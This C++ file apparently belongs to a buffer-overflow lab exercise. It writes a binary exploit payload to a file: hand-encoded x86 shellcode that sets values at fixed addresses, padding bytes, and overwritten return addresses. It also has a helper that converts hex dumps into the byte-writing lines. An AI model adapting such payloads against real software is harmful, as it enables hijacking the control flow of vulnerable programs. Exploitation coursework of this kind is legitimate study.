#include <iostream>
#include <fstream>
#include <string>
#include <sstream>
#include <vector>

void createHexText();
void createTest();

int main(){
  createTest();
  // createHexText();
  return 0;
}

void createTest(){
  std::ofstream file;
  file.open("test.txt", std::ios::binary | std::ios::out);
  file << 'B';

file << (char)0xbf;
file << (char)0x00;
file << (char)0x00;
file << (char)0x00;
file << (char)0x00;
file << (char)0xbe;
file << (char)0x00;
file << (char)0x00;
file << (char)0x00;
file << (char)0x00;
file << (char)0xbb;
file << (char)0xf4;
file << (char)0xaf;
file << (char)0x70;
file << (char)0x55;
file << (char)0xb8;
file << (char)0x80;
file << (char)0xb7;
file << (char)0x04;
file << (char)0x08;
file << (char)0xc7;
file << (char)0x40;
file << (char)0x40;
file << (char)0x64;
file << (char)0x00;
file << (char)0x00;
file << (char)0x00;
file << (char)0xb8;
file << (char)0x80;
file << (char)0xb7;
file << (char)0x04;
file << (char)0x08;
file << (char)0x05;
file << (char)0x90;
file << (char)0x01;
file << (char)0x00;
file << (char)0x00;
file << (char)0xc7;
file << (char)0x40;
file << (char)0x40;
file << (char)0x64;
file << (char)0x00;
file << (char)0x00;
file << (char)0x00;
file << (char)0xb8;
file << (char)0x80;
file << (char)0xb7;
file << (char)0x04;
file << (char)0x08;
file << (char)0x05;
file << (char)0x20;
file << (char)0x03;
file << (char)0x00;
file << (char)0x00;
file << (char)0xc7;
file << (char)0x40;
file << (char)0x40;
file << (char)0x64;
file << (char)0x00;
file << (char)0x00;
file << (char)0x00;
file << (char)0xb8;
file << (char)0x80;
file << (char)0xb7;
file << (char)0x04;
file << (char)0x08;
file << (char)0x05;
file << (char)0xb0;
file << (char)0x04;
file << (char)0x00;
file << (char)0x00;
file << (char)0xc7;
file << (char)0x40;
file << (char)0x40;
file << (char)0x64;
file << (char)0x00;
file << (char)0x00;
file << (char)0x00;
file << (char)0xb8;
file << (char)0x80;
file << (char)0xb7;
file << (char)0x04;
file << (char)0x08;
file << (char)0x05;
file << (char)0x40;
file << (char)0x06;
file << (char)0x00;
file << (char)0x00;
file << (char)0xc7;
file << (char)0x40;
file << (char)0x40;
file << (char)0x09;
file << (char)0x00;
file << (char)0x00;
file << (char)0x00;
file << (char)0x83;
file << (char)0x40;
file << (char)0x40;
file << (char)0x01;
file << (char)0xb8;
file << (char)0x80;
file << (char)0xb7;
file << (char)0x04;
file << (char)0x08;
file << (char)0x05;
file << (char)0xd0;
file << (char)0x07;
file << (char)0x00;
file << (char)0x00;
file << (char)0xc7;
file << (char)0x40;
file << (char)0x40;
file << (char)0x09;
file << (char)0x00;
file << (char)0x00;
file << (char)0x00;
file << (char)0x83;
file << (char)0x40;
file << (char)0x40;
file << (char)0x01;
file << (char)0xb8;
file << (char)0x80;
file << (char)0xb7;
file << (char)0x04;
file << (char)0x08;
file << (char)0x05;
file << (char)0x60;
file << (char)0x09;
file << (char)0x00;
file << (char)0x00;
file << (char)0xc7;
file << (char)0x40;
file << (char)0x40;
file << (char)0x09;
file << (char)0x00;
file << (char)0x00;
file << (char)0x00;
file << (char)0x83;
file << (char)0x40;
file << (char)0x40;
file << (char)0x01;
file << (char)0xb8;
file << (char)0x00;
file << (char)0x00;
file << (char)0x00;
file << (char)0x00;
file << (char)0xc7;
file << (char)0x80;
file << (char)0xb0;
file << (char)0xc2;
file << (char)0x04;
file << (char)0x08;
file << (char)0x09;
file << (char)0x00;
file << (char)0x00;
file << (char)0x00;
file << (char)0x83;
file << (char)0x80;
file << (char)0xb0;
file << (char)0xc2;
file << (char)0x04;
file << (char)0x08;
file << (char)0x01;
file << (char)0xb8;
file << (char)0x80;
file << (char)0xb7;
file << (char)0x04;
file << (char)0x08;
file << (char)0x05;
file << (char)0x80;
file << (char)0x0c;
file << (char)0x00;
file << (char)0x00;
file << (char)0xc7;
file << (char)0x40;
file << (char)0x40;
file << (char)0x64;
file << (char)0x00;
file << (char)0x00;
file << (char)0x00;
file << (char)0xb8;
file << (char)0x80;
file << (char)0xb7;
file << (char)0x04;
file << (char)0x08;
file << (char)0x05;
file << (char)0x10;
file << (char)0x0e;
file << (char)0x00;
file << (char)0x00;
file << (char)0xc7;
file << (char)0x40;
file << (char)0x40;
file << (char)0x64;
file << (char)0x00;
file << (char)0x00;
file << (char)0x00;
file << (char)0xb8;
file << (char)0x80;
file << (char)0xb7;
file << (char)0x04;
file << (char)0x08;
file << (char)0x05;
file << (char)0xa0;
file << (char)0x0f;
file << (char)0x00;
file << (char)0x00;
file << (char)0xc7;
file << (char)0x40;
file << (char)0x40;
file << (char)0x64;
file << (char)0x00;
file << (char)0x00;
file << (char)0x00;
file << (char)0xb8;
file << (char)0x00;
file << (char)0xb0;
file << (char)0x04;
file << (char)0x08;
file << (char)0x68;
file << (char)0x92;
file << (char)0x87;
file << (char)0x04;
file << (char)0x08;
file << (char)0xc3;


  for(int i = 0; i < 54; i ++){
    file << 'A';
  }

  file << (char)0xb8;
  file << (char)0xda;
  file << (char)0xff;
  file << (char)0xff;

    file << (char)0x01;
    file << (char)0xb0;
    file << (char)0x04;
    file << (char)0x08;

    // file << (char)0x71;
    // file << (char)0xd9;
    // file << (char)0xff;
    // file << (char)0xff;

    file.close();
}

void createHexText(){
    std::ifstream file;
    std::ofstream output;
    output.open("makeHex.txt");
    file.open("column.txt");
    std::string fileLine;
    std::vector<std::string> lines = std::vector<std::string>();
    while(std::getline(file, fileLine)){
	std::stringstream lineStream(fileLine);
	std::string temp;
	std::vector<std::string> reverseLines = std::vector<std::string>();	
	while(lineStream >> temp){
	    // std::cout << temp << "HELOO" << std::endl;
	    // output << "file << 0x" << temp << std::endl;
	    reverseLines.push_back(temp);
	}
	auto itt = reverseLines.begin();
	while(itt != reverseLines.end()){
	    lines.push_back(*itt);
	    ++ itt;
	}
    }
    auto it = lines.begin();
    while(it != lines.end()){
	output << "file << (char)0x" << *it << ";" << std::endl;
	++ it;
    }	
    file.close();
    output.close();
}

